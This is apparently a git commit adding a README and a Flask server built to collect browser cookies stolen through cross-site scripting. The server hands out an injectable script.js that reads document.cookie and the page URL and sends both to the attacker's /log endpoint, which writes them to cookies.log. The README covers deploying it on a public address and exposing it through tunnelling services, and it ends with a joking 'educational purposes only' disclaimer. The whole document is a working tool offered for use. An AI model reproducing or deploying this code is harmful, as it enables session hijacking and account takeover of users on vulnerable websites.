e5adf494e9838b9879c15030bdfb5fda007c899f
lavawolfiee <lavawolfiee@gmail.com>
2024-01-27 23:59:58 +0300

    Release

---
+++ README.md
@@ -0,0 +1,39 @@
+HTTP server to log users' cookies when exploiting XSS.
+
+To log cookies, simply send GET request to `/log?data={cookies}&url={url}`. Cookies will be logged to stdout and stored in `cookies.log` file. 
+
+Script for automatic logging is served at `/script.js`. Note that this script is making an XHR, hence to log cookies on HTTPS site this server should be also HTTPS-hosted. Also, HttpOnly cookies obviously will not be logged because javascript can't access them.
+
+## Running
+
+Set SERVER_URL to public (preferably https) url of a server you're running this script on. If you don't have one, see the next section.  
+
+```
+$ export SERVER_URL=https://totally-innocent-url.hack
+$ flask --app 'main:create_app("'$SERVER_URL'")' run --host 0.0.0.0 --port 4444
+```
+
+or with gunicorn (better for production):
+
+```
+$ export SERVER_URL=https://totally-innocent-url.hack
+$ gunicorn 'main:create_app("'$SERVER_URL'")' -b 0.0.0.0:4444
+```
+
+## Getting public url for free
+
+You can use [Tunnelmole](https://tunnelmole.com/), [Telebit](https://telebit.cloud/), [ngrok](https://ngrok.com/) or any other alternative of your choice. It's simple as:
+
+```
+$ tmole 4444
+http://s3rd.tunnelmole.net
+https://s3rd.tunnelmole.net
+```
+
+Then set `SERVER_URL` in the previous section to the received https url and run the server.
+
+## Disclaimer
+
+For educational purposes only and all that jazz.
+
+And I didn't use this for anything nasty, I promise :)
---
+++ main.py
@@ -0,0 +1,79 @@
+import argparse
+import sys
+
+import colorama
+import logging
+
+import flask
+from flask import Flask, request
+
+colorama.init()
+GREEN = colorama.Fore.GREEN
+RESET = colorama.Style.RESET_ALL
+YELLOW = colorama.Fore.YELLOW
+
+# setting up logging
+logger = logging.getLogger(__name__)
+logger.setLevel(logging.INFO)
+
+logFormatter = logging.Formatter("%(asctime)s [%(levelname)-4s]  %(message)s")
+fileHandler = logging.FileHandler("cookies.log")
+fileHandler.setFormatter(logFormatter)
+logger.addHandler(fileHandler)
+
+consoleHandler = logging.StreamHandler(stream=sys.stdout)
+consoleHandler.setFormatter(logFormatter)
+logger.addHandler(consoleHandler)
+
+app = Flask(__name__)
+
+
+@app.route("/script.js")
+def get_script():
+    script = f"""let url = new URL('log', '{app.config['hosted_on_url']}');
+url.searchParams.set('data', document.cookie);
+url.searchParams.set('url', document.URL);
+let xhr = new XMLHttpRequest();
+xhr.open('GET', url);
+xhr.send();"""
+
+    resp = flask.Response(script)
+    resp.headers['Access-Control-Allow-Origin'] = '*'
+
+    return resp
+
+
+@app.route("/log")
+def log_cookie():
+    cookie = str(request.args.get('data'))
+    url = str(request.args.get('url'))
+    logger.info(f"{GREEN}Got cookie{RESET} on \"{url}\": {cookie}")
+
+    resp = flask.Response("")
+    resp.headers['Access-Control-Allow-Origin'] = '*'
+
+    return resp
+
+
+def create_app(url: str) -> Flask:
+    if not url.endswith('/'):
+        url += '/'
+    if not url.startswith('http'):
+        url = 'http://' + url
+
+    app.config['hosted_on_url'] = url
+
+    print(f'{YELLOW}[*] Inject this script to log cookie:{RESET} {url + "script.js"}')
+
+    return app
+
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-u', '--url', type=str, required=True,
+                        help='Url on which this site is hosted. Must be https for script to work on https sites')
+    # parser.add_argument('-p', '--port', type=int, required=True,
+    #                     help='Port to run the server on')
+    args = parser.parse_args()
+
+    create_app(args.url).run()
